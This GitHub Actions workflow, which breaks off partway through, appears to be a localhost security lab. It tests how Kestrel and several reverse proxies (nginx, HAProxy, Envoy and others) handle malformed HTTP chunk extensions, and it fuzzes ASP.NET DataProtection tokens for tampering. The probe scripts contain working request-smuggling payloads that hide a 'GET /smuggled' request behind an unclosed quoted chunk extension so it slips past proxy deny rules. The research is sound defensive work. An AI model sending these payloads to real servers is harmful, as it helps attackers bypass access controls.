name: Kestrel chunk-extension lab

on:
  push:
    branches:
      - lab/kestrel-chunk-extensions-20260920
  pull_request:
    branches:
      - main

permissions:
  contents: read

jobs:
  probe:
    strategy:
      fail-fast: false
      matrix:
        include:
          - label: net10-10.0.12
            sdk: 10.0.401
            tfm: net10.0
          - label: net11-rc1
            sdk: 11.0.100-rc.1.26425.128
            tfm: net11.0
    runs-on: ubuntu-latest
    name: ${{ matrix.label }}
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: ${{ matrix.sdk }}

      - name: Build isolated localhost Kestrel harness
        shell: bash
        run: |
          set -euxo pipefail
          mkdir -p /tmp/kestrel-lab
          cat >/tmp/kestrel-lab/Lab.csproj <<EOF
          <Project Sdk="Microsoft.NET.Sdk.Web">
            <PropertyGroup>
              <TargetFramework>${{ matrix.tfm }}</TargetFramework>
              <ImplicitUsings>enable</ImplicitUsings>
              <Nullable>enable</Nullable>
            </PropertyGroup>
          </Project>
          EOF
          cat >/tmp/kestrel-lab/Program.cs <<'EOF'
          using System.Text;

          var builder = WebApplication.CreateBuilder(args);
          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5005));
          var app = builder.Build();

          app.Run(async context =>
          {
              using var body = new MemoryStream();
              await context.Request.Body.CopyToAsync(body);
              var bytes = body.ToArray();
              Console.WriteLine($"HIT method={context.Request.Method} path={context.Request.Path} bodyHex={Convert.ToHexString(bytes)}");
              context.Response.ContentType = "text/plain";
              await context.Response.WriteAsync($"{context.Request.Method} {context.Request.Path} body={Encoding.ASCII.GetString(bytes)}");
          });

          await app.RunAsync();
          EOF
          dotnet --info
          dotnet build /tmp/kestrel-lab/Lab.csproj -c Release

      - name: Run parser experiments over loopback only
        shell: bash
        run: |
          set -euxo pipefail
          cd /tmp/kestrel-lab
          dotnet run --no-build -c Release --project Lab.csproj >server.log 2>&1 &
          echo $! > server.pid
          cleanup() { kill "$(cat server.pid)" 2>/dev/null || true; }
          trap cleanup EXIT

          for i in {1..50}; do
            if curl -sS --max-time 1 http://127.0.0.1:5005/ready >/dev/null 2>&1; then break; fi
            sleep 0.2
          done

          cat >probe.py <<'PY'
          import json, socket, time

          HOST, PORT = "127.0.0.1", 5005

          cases = {
              "valid_token": b'1;a=b\r\n',
              "valid_quoted": b'1;a="b"\r\n',
              "valid_quoted_pair": b'1;a="b\\\\c"\r\n',
              "unclosed_quote": b'1;a="\r\n',
              "missing_name": b'1;\r\n',
              "missing_value": b'1;a=\r\n',
              "multiple_semicolons": b'1;;;\r\n',
              "nul_in_extension": b'1;\x00ext\r\n',
              "invalid_value_at": b'1;a=@\r\n',
              "bws_before_semicolon": b'1 ;a=b\r\n',
              "bare_lf_extension": b'1;a=b\n',
              "bare_cr_extension": b'1;a=b\rX\r\n',
          }

          def send_case(name, chunkline):
              first = (
                  b"POST /public HTTP/1.1\r\n"
                  b"Host: localhost\r\n"
                  b"Transfer-Encoding: chunked\r\n"
                  b"\r\n"
                  + chunkline
                  + b"X\r\n"
                  + b"0\r\n"
                  + b"\r\n"
              )
              second = (
                  b"GET /smuggled HTTP/1.1\r\n"
                  b"Host: localhost\r\n"
                  b"Connection: close\r\n"
                  b"\r\n"
              )
              s = socket.create_connection((HOST, PORT), timeout=3)
              s.settimeout(2)
              s.sendall(first + second)
              data = bytearray()
              while True:
                  try:
                      part = s.recv(65536)
                      if not part:
                          break
                      data.extend(part)
                  except socket.timeout:
                      break
              s.close()
              raw = bytes(data)
              result = {
                  "case": name,
                  "chunkline_hex": chunkline.hex(),
                  "http_responses": raw.count(b"HTTP/1.1 "),
                  "statuses": [
                      line.decode("latin1", "replace")
                      for line in raw.split(b"\r\n")
                      if line.startswith(b"HTTP/1.1 ")
                  ],
                  "contains_public_body": b"POST /public body=X" in raw,
                  "contains_smuggled_body": b"GET /smuggled body=" in raw,
                  "response_preview": raw[:800].decode("latin1", "replace"),
              }
              print(json.dumps(result, sort_keys=True))
              return result

          results = []
          for name, line in cases.items():
              results.append(send_case(name, line))
              time.sleep(0.1)

          with open("results.json", "w") as f:
              json.dump(results, f, indent=2, sort_keys=True)
          PY

          python3 probe.py | tee probe.out
          echo "=== SERVER LOG ==="
          cat server.log

      - name: Upload experiment results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: kestrel-chunk-extension-${{ matrix.label }}
          path: |
            /tmp/kestrel-lab/results.json
            /tmp/kestrel-lab/probe.out
            /tmp/kestrel-lab/server.log


  proxy-differential:
    runs-on: ubuntu-latest
    name: proxy-differential-net10
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 10.0.401

      - name: Install local reverse proxies
        shell: bash
        run: |
          sudo apt-get update
          sudo apt-get install -y haproxy nginx

      - name: Build localhost Kestrel origin
        shell: bash
        run: |
          set -euxo pipefail
          mkdir -p /tmp/kestrel-proxy-lab
          cat >/tmp/kestrel-proxy-lab/Lab.csproj <<'EOF'
          <Project Sdk="Microsoft.NET.Sdk.Web">
            <PropertyGroup>
              <TargetFramework>net10.0</TargetFramework>
              <ImplicitUsings>enable</ImplicitUsings>
              <Nullable>enable</Nullable>
            </PropertyGroup>
          </Project>
          EOF
          cat >/tmp/kestrel-proxy-lab/Program.cs <<'EOF'
          var builder = WebApplication.CreateBuilder(args);
          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5005));
          var app = builder.Build();
          app.Run(async context =>
          {
              using var body = new MemoryStream();
              await context.Request.Body.CopyToAsync(body);
              Console.WriteLine($"ORIGIN_HIT method={context.Request.Method} path={context.Request.Path} bodyHex={Convert.ToHexString(body.ToArray())}");
              await context.Response.WriteAsync($"{context.Request.Method} {context.Request.Path}");
          });
          await app.RunAsync();
          EOF
          dotnet build /tmp/kestrel-proxy-lab/Lab.csproj -c Release

      - name: Configure HAProxy and nginx on loopback
        shell: bash
        run: |
          set -euxo pipefail
          cat >/tmp/haproxy-lab.cfg <<'EOF'
          global
              daemon
          defaults
              mode http
              timeout connect 3s
              timeout client 5s
              timeout server 5s
          frontend fe
              bind 127.0.0.1:5006
              http-request deny deny_status 403 if { path -i /smuggled }
              default_backend be
          backend be
              server origin 127.0.0.1:5005
          EOF

          cat >/tmp/nginx-lab.conf <<'EOF'
          events {}
          http {
            access_log /tmp/nginx-access.log;
            error_log /tmp/nginx-error.log info;
            server {
              listen 127.0.0.1:5007;
              location = /smuggled { return 403; }
              location / {
                proxy_http_version 1.1;
                proxy_request_buffering off;
                proxy_pass http://127.0.0.1:5005;
              }
            }
          }
          EOF

      - name: Run exact quoted-extension differential through origin and proxies
        shell: bash
        run: |
          set -euxo pipefail
          cd /tmp/kestrel-proxy-lab
          dotnet run --no-build -c Release --project Lab.csproj >origin.log 2>&1 &
          echo $! > origin.pid
          haproxy -f /tmp/haproxy-lab.cfg
          sudo nginx -c /tmp/nginx-lab.conf

          cleanup() {
            kill "$(cat origin.pid)" 2>/dev/null || true
            sudo nginx -s stop -c /tmp/nginx-lab.conf 2>/dev/null || true
            sudo pkill haproxy 2>/dev/null || true
          }
          trap cleanup EXIT
          sleep 1

          cat >proxy_probe.py <<'PY'
          import json, socket, time

          payload = (
              b"POST /public HTTP/1.1\r\n"
              b"Host: localhost\r\n"
              b"Transfer-Encoding: chunked\r\n"
              b"\r\n"
              b'1;a="\r\n'
              b"X\r\n"
              b"0\r\n"
              b"\r\n"
              b"GET /smuggled HTTP/1.1\r\n"
              b"Host: localhost\r\n"
              b"Content-Length: 11\r\n"
              b"Connection: close\r\n"
              b"\r\n"
              b'"\r\n'
              b"Y\r\n"
              b"0\r\n"
              b"\r\n"
          )

          valid = (
              b"POST /public HTTP/1.1\r\n"
              b"Host: localhost\r\n"
              b"Transfer-Encoding: chunked\r\n"
              b"Connection: close\r\n"
              b"\r\n"
              b"1;a=b\r\n"
              b"X\r\n"
              b"0\r\n"
              b"\r\n"
          )

          def send(port, data):
              s = socket.create_connection(("127.0.0.1", port), timeout=3)
              s.settimeout(3)
              s.sendall(data)
              out = bytearray()
              while True:
                  try:
                      p = s.recv(65536)
                      if not p: break
                      out.extend(p)
                  except socket.timeout:
                      break
              s.close()
              raw=bytes(out)
              return {
                  "responses": raw.count(b"HTTP/1.1 "),
                  "statuses": [x.decode("latin1") for x in raw.split(b"\r\n") if x.startswith(b"HTTP/1.1 ")],
                  "preview": raw[:1000].decode("latin1","replace")
              }

          results={}
          for label,port in [("direct",5005),("haproxy",5006),("nginx",5007)]:
              results[label]={"valid":send(port,valid),"quoted_poc":send(port,payload)}
              time.sleep(.2)
          print(json.dumps(results, indent=2, sort_keys=True))
          open("proxy-results.json","w").write(json.dumps(results, indent=2, sort_keys=True))
          PY

          python3 proxy_probe.py | tee proxy-probe.out
          sleep 1
          echo "=== ORIGIN ==="
          cat origin.log
          echo "=== NGINX ACCESS ==="
          cat /tmp/nginx-access.log || true
          echo "=== NGINX ERROR ==="
          cat /tmp/nginx-error.log || true

      - name: Upload proxy differential results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: kestrel-proxy-differential-net10
          path: |
            /tmp/kestrel-proxy-lab/proxy-results.json
            /tmp/kestrel-proxy-lab/proxy-probe.out
            /tmp/kestrel-proxy-lab/origin.log
            /tmp/nginx-access.log
            /tmp/nginx-error.log


  aspnetcore-main-regression:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    name: aspnetcore-main-regression
    steps:
      - name: Clone ASP.NET Core main with submodules
        shell: bash
        run: |
          git clone --depth 1 --recurse-submodules --shallow-submodules https://github.com/dotnet/aspnetcore.git /tmp/aspnetcore

      - name: Restore repository toolchain
        shell: bash
        run: |
          cd /tmp/aspnetcore
          ./restore.sh

      - name: Run current-main Kestrel chunk-extension regression tests
        shell: bash
        run: |
          set -exo pipefail
          cd /tmp/aspnetcore
          set +u
          source ./activate.sh
          set -u
          dotnet test src/Servers/Kestrel/test/InMemory.FunctionalTests/InMemory.FunctionalTests.csproj \
            --filter "FullyQualifiedName~ChunkedRequestTests.RejectsInvalidChunkExtensions|FullyQualifiedName~ChunkedRequestTests.AllowsValidChunkExtensions" \
            --logger "console;verbosity=normal" | tee /tmp/aspnetcore-main-kestrel-tests.log

      - name: Upload current-main regression log
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: aspnetcore-main-kestrel-regression
          path: /tmp/aspnetcore-main-kestrel-tests.log


  more-frontends-net10:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    name: more-frontends-net10
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 10.0.401

      - name: Install Apache, Varnish, and Squid
        shell: bash
        run: |
          sudo apt-get update
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y apache2 varnish squid
          sudo a2enmod proxy proxy_http >/dev/null

      - name: Build instrumented Kestrel origin
        shell: bash
        run: |
          set -euxo pipefail
          mkdir -p /tmp/frontends-lab
          cat >/tmp/frontends-lab/Lab.csproj <<'EOF'
          <Project Sdk="Microsoft.NET.Sdk.Web">
            <PropertyGroup>
              <TargetFramework>net10.0</TargetFramework>
              <ImplicitUsings>enable</ImplicitUsings>
              <Nullable>enable</Nullable>
            </PropertyGroup>
          </Project>
          EOF
          cat >/tmp/frontends-lab/Program.cs <<'EOF'
          var builder = WebApplication.CreateBuilder(args);
          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5005));
          var app = builder.Build();
          app.Run(async context =>
          {
              using var body = new MemoryStream();
              await context.Request.Body.CopyToAsync(body);
              var probe = context.Request.Headers["X-Probe"].ToString();
              Console.WriteLine($"ORIGIN_HIT probe={probe} method={context.Request.Method} path={context.Request.Path} bodyHex={Convert.ToHexString(body.ToArray())}");
              await context.Response.WriteAsync($"{context.Request.Method} {context.Request.Path}");
          });
          await app.RunAsync();
          EOF
          dotnet build /tmp/frontends-lab/Lab.csproj -c Release

      - name: Configure frontends
        shell: bash
        run: |
          set -euxo pipefail

          cat >/tmp/apache-lab.conf <<'EOF'
          ServerRoot "/etc/apache2"
          PidFile /tmp/apache-lab.pid
          Listen 127.0.0.1:5008
          ServerName localhost
          IncludeOptional mods-enabled/*.load
          IncludeOptional mods-enabled/*.conf
          User www-data
          Group www-data
          ErrorLog /tmp/apache-error.log
          LogLevel info
          CustomLog /tmp/apache-access.log combined
          ProxyRequests Off
          ProxyPass / http://127.0.0.1:5005/
          ProxyPassReverse / http://127.0.0.1:5005/
          <Location "/smuggled">
              Require all denied
          </Location>
          EOF

          cat >/tmp/varnish-lab.vcl <<'EOF'
          vcl 4.1;
          backend default {
              .host = "127.0.0.1";
              .port = "5005";
          }
          sub vcl_recv {
              if (req.url == "/smuggled") {
                  return (synth(403, "blocked"));
              }
              return (pass);
          }
          EOF

          cat >/tmp/squid-lab.conf <<'EOF'
          http_port 127.0.0.1:5010 accel vhost defaultsite=localhost
          cache_peer 127.0.0.1 parent 5005 0 no-query originserver name=origin
          acl blocked urlpath_regex ^/smuggled$
          http_access deny blocked
          http_access allow all
          cache_peer_access origin allow all
          access_log stdio:/tmp/squid-access.log
          cache_log /tmp/squid-cache.log
          pid_filename /tmp/squid-lab.pid
          coredump_dir /tmp
          EOF

          cat >/tmp/Caddyfile <<'EOF'
          :5011 {
              @blocked path /smuggled
              respond @blocked 403
              reverse_proxy 127.0.0.1:5005
          }
          EOF

          cat >/tmp/traefik-static.yml <<'EOF'
          entryPoints:
            web:
              address: ":5012"
          providers:
            file:
              filename: /etc/traefik/dynamic.yml
          log:
            level: INFO
          EOF

          cat >/tmp/traefik-dynamic.yml <<'EOF'
          http:
            routers:
              blocked:
                rule: 'Path(`/smuggled`)'
                entryPoints: [web]
                priority: 100
                middlewares: [denyall]
                service: origin
              normal:
                rule: 'PathPrefix(`/`)'
                entryPoints: [web]
                priority: 1
                service: origin
            middlewares:
              denyall:
                ipAllowList:
                  sourceRange:
                    - "192.0.2.0/24"
            services:
              origin:
                loadBalancer:
                  servers:
                    - url: "http://127.0.0.1:5005"
          EOF

          cat >/tmp/envoy-lab.yml <<'EOF'
          static_resources:
            listeners:
              - name: listener_0
                address:
                  socket_address:
                    address: 0.0.0.0
                    port_value: 5013
                filter_chains:
                  - filters:
                      - name: envoy.filters.network.http_connection_manager
                        typed_config:
                          "@type": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager
                          stat_prefix: ingress_http
                          route_config:
                            name: local_route
                            virtual_hosts:
                              - name: local_service
                                domains: ["*"]
                                routes:
                                  - match:
                                      path: "/smuggled"
                                    direct_response:
                                      status: 403
                                  - match:
                                      prefix: "/"
                                    route:
                                      cluster: origin
                          http_filters:
                            - name: envoy.filters.http.router
                              typed_config:
                                "@type": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router
            clusters:
              - name: origin
                connect_timeout: 1s
                type: STATIC
                load_assignment:
                  cluster_name: origin
                  endpoints:
                    - lb_endpoints:
                        - endpoint:
                            address:
                              socket_address:
                                address: 127.0.0.1
                                port_value: 5005
          EOF

      - name: Run frontend differential matrix
        shell: bash
        run: |
          set -euxo pipefail
          cd /tmp/frontends-lab
          dotnet run --no-build -c Release --project Lab.csproj >origin.log 2>&1 &
          echo $! > origin.pid

          sudo /usr/sbin/apache2 -f /tmp/apache-lab.conf -DFOREGROUND >/tmp/apache-stdout.log 2>&1 &
          echo $! > apache.pid
          sudo pkill varnishd 2>/dev/null || true
          sudo rm -rf /tmp/varnish-lab-instance
          sudo mkdir -p /tmp/varnish-lab-instance
          sudo varnishd -n /tmp/varnish-lab-instance -a 127.0.0.1:5009 -f /tmp/varnish-lab.vcl -s malloc,64m -F >/tmp/varnish.log 2>&1 &
          echo $! > varnish.pid
          sudo squid -z -f /tmp/squid-lab.conf >/tmp/squid-init.log 2>&1 || true
          sudo squid -N -f /tmp/squid-lab.conf >/tmp/squid-stdout.log 2>&1 &
          echo $! > squid.pid
          docker run --rm --network host --name caddy-lab -v /tmp/Caddyfile:/etc/caddy/Caddyfile:ro caddy:2 >/tmp/caddy.log 2>&1 &
          docker run --rm --network host --name traefik-lab -v /tmp/traefik-static.yml:/etc/traefik/traefik.yml:ro -v /tmp/traefik-dynamic.yml:/etc/traefik/dynamic.yml:ro traefik:v3 >/tmp/traefik.log 2>&1 &
          docker run --rm --network host --name envoy-lab -v /tmp/envoy-lab.yml:/etc/envoy/envoy.yaml:ro envoyproxy/envoy:v1.39.1 -c /etc/envoy/envoy.yaml >/tmp/envoy.log 2>&1 &

          cleanup() {
            kill "$(cat origin.pid)" 2>/dev/null || true
            sudo kill "$(cat apache.pid)" 2>/dev/null || true
            sudo kill "$(cat varnish.pid)" 2>/dev/null || true
            sudo kill "$(cat squid.pid)" 2>/dev/null || true
            docker rm -f caddy-lab traefik-lab envoy-lab >/dev/null 2>&1 || true
          }
          trap cleanup EXIT

          python3 - <<'PY'
          import socket,time
          for _ in range(120):
              ok=True
              for p in [5005,5008,5009,5010,5011,5012,5013]:
                  try:
                      s=socket.create_connection(("127.0.0.1",p),timeout=.2);s.close()
                  except Exception:
                      ok=False
              if ok: break
              time.sleep(.25)
          PY

          cat >frontends_probe.py <<'PY'
          import json, socket, time

          targets=[
              ("direct",5005),
              ("apache",5008),
              ("varnish",5009),
              ("squid",5010),
              ("caddy",5011),
              ("traefik",5012),
              ("envoy",5013),
          ]

          def payload(label, malformed=True):
              chunk = b'1;a="\r\n' if malformed else b"1;a=b\r\n"
              second = (
                  b"GET /smuggled HTTP/1.1\r\n"
                  b"Host: localhost\r\n"
                  + f"X-Probe: {label}\r\n".encode()
                  + b"Content-Length: 11\r\n"
                  b"Connection: close\r\n"
                  b"\r\n"
                  b'"\r\nY\r\n0\r\n\r\n'
              )
              return (
                  b"POST /public HTTP/1.1\r\n"
                  b"Host: localhost\r\n"
                  b"Transfer-Encoding: chunked\r\n"
                  + f"X-Probe: {label}-first\r\n".encode()
                  + (b"Connection: close\r\n" if not malformed else b"")
                  + b"\r\n"
                  + chunk + b"X\r\n0\r\n\r\n"
                  + (second if malformed else b"")
              )

          def send(port,data):
              s=socket.create_connection(("127.0.0.1",port),timeout=4)
              s.settimeout(4)
              s.sendall(data)
              out=bytearray()
              while True:
                  try:
                      part=s.recv(65536)
                      if not part: break
                      out.extend(part)
                  except socket.timeout:
                      break
              s.close()
              raw=bytes(out)
              return {
                  "responses":raw.count(b"HTTP/1.1 "),
                  "statuses":[x.decode("latin1","replace") for x in raw.split(b"\r\n") if x.startswith(b"HTTP/1.")],
                  "preview":raw[:1200].decode("latin1","replace")
              }

          results={}
          for label,port in targets:
              try:
                  results[label]={
                      "valid":send(port,payload(label+"-valid",False)),
                      "quoted_poc":send(port,payload(label,True)),
                  }
              except Exception as e:
                  results[label]={"error":repr(e)}
              time.sleep(.25)

          print(json.dumps(results,indent=2,sort_keys=True))
          open("frontends-results.json","w").write(json.dumps(results,indent=2,sort_keys=True))
          PY

          python3 frontends_probe.py | tee frontends-probe.out
          sleep 1
          echo "=== ORIGIN HITS ==="
          grep ORIGIN_HIT origin.log || true
          echo "=== APACHE ERROR ==="
          tail -100 /tmp/apache-error.log || true
          echo "=== VARNISH ==="
          tail -100 /tmp/varnish.log || true
          echo "=== SQUID ==="
          tail -100 /tmp/squid-cache.log || true
          echo "=== CADDY ==="
          tail -100 /tmp/caddy.log || true
          echo "=== TRAEFIK ==="
          tail -100 /tmp/traefik.log || true
          echo "=== ENVOY ==="
          tail -100 /tmp/envoy.log || true

      - name: Upload frontend matrix
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: kestrel-more-frontends-net10
          path: |
            /tmp/frontends-lab/frontends-results.json
            /tmp/frontends-lab/frontends-probe.out
            /tmp/frontends-lab/origin.log
            /tmp/apache-error.log
            /tmp/varnish.log
            /tmp/caddy.log
            /tmp/traefik.log
            /tmp/envoy.log


  dataprotection-variant-fuzz:
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-15]
    runs-on: ${{ matrix.os }}
    timeout-minutes: 20
    name: dataprotection-variant-fuzz-${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 11.0.100-rc.1.26425.128

      - name: Build DataProtection differential harness
        shell: bash
        run: |
          set -euxo pipefail
          mkdir -p /tmp/dp-lab
          cat >/tmp/dp-lab/DpLab.csproj <<'EOF'
          <Project Sdk="Microsoft.NET.Sdk">
            <PropertyGroup>
              <OutputType>Exe</OutputType>
              <TargetFramework>net11.0</TargetFramework>
              <ImplicitUsings>enable</ImplicitUsings>
              <Nullable>enable</Nullable>
            </PropertyGroup>
            <ItemGroup>
              <FrameworkReference Include="Microsoft.AspNetCore.App" />
            </ItemGroup>
          </Project>
          EOF

          cat >/tmp/dp-lab/Program.cs <<'EOF'
          using System.Buffers;
          using System.Security.Cryptography;
          using Microsoft.AspNetCore.DataProtection;
          using Microsoft.AspNetCore.DataProtection.AuthenticatedEncryption.ConfigurationModel;
          using Microsoft.Extensions.DependencyInjection;

          static ServiceProvider BuildProvider(string dir, string appName, bool hmac512)
          {
              Directory.CreateDirectory(dir);
              var services = new ServiceCollection();
              var builder = services.AddDataProtection()
                  .PersistKeysToFileSystem(new DirectoryInfo(dir))
                  .SetApplicationName(appName);

              if (hmac512)
              {
                  builder.UseCustomCryptographicAlgorithms(new ManagedAuthenticatedEncryptorConfiguration
                  {
                      EncryptionAlgorithmType = typeof(Aes),
                      EncryptionAlgorithmKeySize = 256,
                      ValidationAlgorithmType = typeof(HMACSHA512)
                  });
              }

              return services.BuildServiceProvider();
          }

          static byte[] SpanProtect(ISpanDataProtector p, ReadOnlySpan<byte> plaintext)
          {
              var writer = new ArrayBufferWriter<byte>();
              p.Protect(plaintext, ref writer);
              return writer.WrittenSpan.ToArray();
          }

          static (bool ok, byte[]? plaintext, string? ex) ByteUnprotect(IDataProtector p, byte[] token)
          {
              try { return (true, p.Unprotect(token), null); }
              catch (Exception e) { return (false, null, e.GetType().Name); }
          }

          static (bool ok, byte[]? plaintext, string? ex) SpanUnprotect(ISpanDataProtector p, byte[] token)
          {
              try
              {
                  var writer = new ArrayBufferWriter<byte>();
                  p.Unprotect(token, ref writer);
                  return (true, writer.WrittenSpan.ToArray(), null);
              }
              catch (Exception e) { return (false, null, e.GetType().Name); }
          }

          static IEnumerable<(string name, byte[] bytes)> Mutations(byte[] token)
          {
              for (int i = 0; i < token.Length; i++)
              {
                  var x = (byte[])token.Clone();
                  x[i] ^= 0x01;
                  yield return ($"flip1-{i}", x);
              }

              for (int i = 0; i < token.Length; i++)
              {
                  if (token[i] == 0) continue;
                  var x = (byte[])token.Clone();
                  x[i] = 0;
                  yield return ($"zero-{i}", x);
              }

              foreach (var cut in new[] {0,1,3,4,15,16,19,20,21,31,32,33, token.Length-65, token.Length-64, token.Length-33, token.Length-32, token.Length-17, token.Length-16, token.Length-1})
              {
                  if (cut >= 0 && cut < token.Length)
                      yield return ($"truncate-{cut}", token.AsSpan(0, cut).ToArray());
              }

              foreach (var n in new[] {1, 8, 16, 32, 64})
              {
                  var x = new byte[token.Length + n];
                  token.CopyTo(x, 0);
                  yield return ($"append-zero-{n}", x);
              }

              foreach (var n in new[] {16, 32, 64})
              {
                  if (token.Length >= n)
                  {
                      var x = (byte[])token.Clone();
                      Array.Clear(x, x.Length - n, n);
                      yield return ($"zero-tail-{n}", x);
                  }
              }

              if (token.Length >= 20)
              {
                  var x=(byte[])token.Clone();
                  Array.Clear(x,0,4);
                  yield return ("zero-magic",x);

                  x=(byte[])token.Clone();
                  Array.Clear(x,4,16);
                  yield return ("zero-keyid",x);
              }

              var rnd = new Random(1337);
              for (int n=0;n<2500;n++)
              {
                  var x=(byte[])token.Clone();
                  var edits=1+rnd.Next(4);
                  for(int e=0;e<edits;e++)
                  {
                      var idx=rnd.Next(x.Length);
                      x[idx]=(byte)rnd.Next(256);
                  }
                  yield return ($"random-{n}",x);
              }
          }

          static void RequireReject(string label, IDataProtector byteProtector, ISpanDataProtector spanProtector, byte[] originalToken)
          {
              int total=0, accepted=0, differential=0;
              foreach (var (name, bytes) in Mutations(originalToken))
              {
                  if (bytes.AsSpan().SequenceEqual(originalToken)) continue;
                  total++;
                  var a=ByteUnprotect(byteProtector, bytes);
                  var b=SpanUnprotect(spanProtector, bytes);

                  if (a.ok || b.ok)
                  {
                      accepted++;
                      Console.WriteLine($"ACCEPTED_TAMPER label={label} mutation={name} byte={a.ok} span={b.ok} bytePlain={Convert.ToHexString(a.plaintext ?? [])} spanPlain={Convert.ToHexString(b.plaintext ?? [])}");
                  }

                  if (a.ok != b.ok || (a.ok && b.ok && !(a.plaintext ?? []).AsSpan().SequenceEqual(b.plaintext ?? [])))
                  {
                      differential++;
                      Console.WriteLine($"DIFFERENTIAL label={label} mutation={name} byte={a.ok}/{a.ex} span={b.ok}/{b.ex}");
                  }
              }

              Console.WriteLine($"MUTATION_SUMMARY label={label} total={total} accepted={accepted} differential={differential}");
              if (accepted != 0 || differential != 0)
                  Environment.ExitCode = 2;
          }

          static void MustFail(string label, Func<byte[]> action)
          {
              try
              {
                  var x=action();
                  Console.WriteLine($"ISOLATION_FAILURE label={label} plaintext={Convert.ToHexString(x)}");
                  Environment.ExitCode=3;
              }
              catch (CryptographicException)
              {
                  Console.WriteLine($"ISOLATION_OK label={label}");
              }
          }

          var root=Path.Combine(Path.GetTempPath(),"dp-variant-"+Guid.NewGuid().ToString("N"));
          var keysDefault=Path.Combine(root,"default");
          var keysHmac512=Path.Combine(root,"hmac512");

          foreach (var cfg in new[] {("default",keysDefault,false),("hmac512",keysHmac512,true)})
          {
              using var sp=BuildProvider(cfg.Item2,"lab-app",cfg.Item3);
              var provider=sp.GetRequiredService<IDataProtectionProvider>();
              var protector=provider.CreateProtector("primary-purpose");

              if (protector is not ISpanDataProtector spanProtector)
                  throw new Exception("Expected ISpanDataProtector on net11.0.");

              foreach (var len in new[] {0,1,15,16,17,31,32,33,79,80,81,127,128,129,255,256,257,1024})
              {
                  var plaintext=new byte[len];
                  RandomNumberGenerator.Fill(plaintext);

                  var byteToken=protector.Protect(plaintext);
                  var spanToken=SpanProtect(spanProtector,plaintext);

                  var byteRoundtrip=protector.Unprotect(byteToken);
                  var spanRoundtrip=SpanUnprotect(spanProtector,spanToken);
                  if (!byteRoundtrip.AsSpan().SequenceEqual(plaintext) || !spanRoundtrip.ok || !(spanRoundtrip.plaintext ?? []).AsSpan().SequenceEqual(plaintext))
                      throw new Exception($"Roundtrip failed cfg={cfg.Item1} len={len}");

                  if (len is 0 or 1 or 31 or 32 or 79 or 80 or 81 or 255 or 256 or 257)
                  {
                      RequireReject($"{cfg.Item1}-byteToken-len{len}",protector,spanProtector,byteToken);
                      RequireReject($"{cfg.Item1}-spanToken-len{len}",protector,spanProtector,spanToken);
                  }
              }

              var pA=provider.CreateProtector("A");
              var pB=provider.CreateProtector("B");
              var tokA=pA.Protect("secret"u8.ToArray());
              MustFail($"{cfg.Item1}-purpose-A-vs-B",()=>pB.Unprotect(tokA));

              var nested1=provider.CreateProtector("a").CreateProtector("bc");
              var nested2=provider.CreateProtector("ab").CreateProtector("c");
              var nestedTok=nested1.Protect("nested"u8.ToArray());
              MustFail($"{cfg.Item1}-nested-purpose-boundary",()=>nested2.Unprotect(nestedTok));

              var emptyPurpose=provider.CreateProtector("");
              var nulPurpose=provider.CreateProtector("\0");
              var emptyTok=emptyPurpose.Protect("empty"u8.ToArray());
              MustFail($"{cfg.Item1}-empty-vs-nul-purpose",()=>nulPurpose.Unprotect(emptyTok));
          }

          // Same physical key ring, different application discriminators.
          var shared=Path.Combine(root,"shared");
          using var appA=BuildProvider(shared,"app-A",false);
          var providerA=appA.GetRequiredService<IDataProtectionProvider>();
          var crossToken=providerA.CreateProtector("purpose").Protect("cross-app"u8.ToArray());

          // Ensure key has been flushed before opening second provider.
          using var appB=BuildProvider(shared,"app-B",false);
          var providerB=appB.GetRequiredService<IDataProtectionProvider>();
          MustFail("application-discriminator-A-vs-B",()=>providerB.CreateProtector("purpose").Unprotect(crossToken));

          Console.WriteLine($"FINAL_EXIT_CODE={Environment.ExitCode}");
          EOF

          dotnet build /tmp/dp-lab/DpLab.csproj -c Release

      - name: Run DataProtection differential/tamper suite
        shell: bash
        run: |
          set -o pipefail
          cd /tmp/dp-lab
          dotnet run --no-build -c Release --project DpLab.csproj | tee dataprotection-results.log
          test "${PIPESTATUS[0]}" -eq 0

      - name: Upload DataProtection results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: dataprotection-variant-fuzz-${{ matrix.os }}
          path: /tmp/dp-lab/dataprotection-results.log


  nested-map-backslash-variant:
    strategy:
      fail-fast: false
      matrix:
        include:
          - label: net10-10.0.12
            sdk: 10.0.401
            tfm: net10.0
          - label: net11-rc1
            sdk: 11.0.100-rc.1.26425.128
            tfm: net11.0
    runs-on: ubuntu-latest
    name: nested-map-backslash-${{ matrix.label }}
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: ${{ matrix.sdk }}

      - name: Build nested Map authorization harness
        shell: bash
        run: |
          set -euxo pipefail
          mkdir -p /tmp/map-lab
          cat >/tmp/map-lab/MapLab.csproj <<EOF
          <Project Sdk="Microsoft.NET.Sdk.Web">
            <PropertyGroup>
              <TargetFramework>${{ matrix.tfm }}</TargetFramework>
              <ImplicitUsings>enable</ImplicitUsings>
              <Nullable>enable</Nullable>
            </PropertyGroup>
          </Project>
          EOF

          cat >/tmp/map-lab/Program.cs <<'EOF'
          using Microsoft.AspNetCore.Http.Features;

          var builder = WebApplication.CreateBuilder(args);
          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5025));
          var app = builder.Build();

          app.Use(async (ctx, next) =>
          {
